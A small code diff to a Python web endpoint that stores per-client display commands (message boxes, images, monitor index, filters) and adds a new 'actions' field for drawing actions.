@@ -72,10 +72,11 @@ def send_command():
     image_type = data.get("image_type", "") # New: Get image_type, default empty string
     filters = data.get("filters", None) # New: Get filters, default None
     enable = data.get("enable", False) # New: Get enable, default False
+    actions = data.get("actions", None) # Get drawing actions
 
     if client_id and cmd:
         # Store all relevant command data including monitor_index and image
-        client_commands[client_id] = {"cmd": cmd, "title": title, "message": message, "icon": icon, "buttons": buttons, "topmost": topmost, "monitor_index": monitor_index, "image": image, "pid": pid, "image_type": image_type, "filters": filters, "enable": enable}
+        client_commands[client_id] = {"cmd": cmd, "title": title, "message": message, "icon": icon, "buttons": buttons, "topmost": topmost, "monitor_index": monitor_index, "image": image, "pid": pid, "image_type": image_type, "filters": filters, "enable": enable, "actions": actions}
         print(f"Command '{cmd}' for client {client_id} (Title: '{title}', Message: '{message}', Icon: '{icon}', Buttons: '{buttons}', Top Most: {topmost}, Monitor Index: {monitor_index}, Image: {image is not None}, Image Type: {image_type}, Filters: {filters}, Enable: {enable}) received.")
         return jsonify({"status": "success", "message": "Command received"}), 200
     print(f"Invalid command data received: {data}")
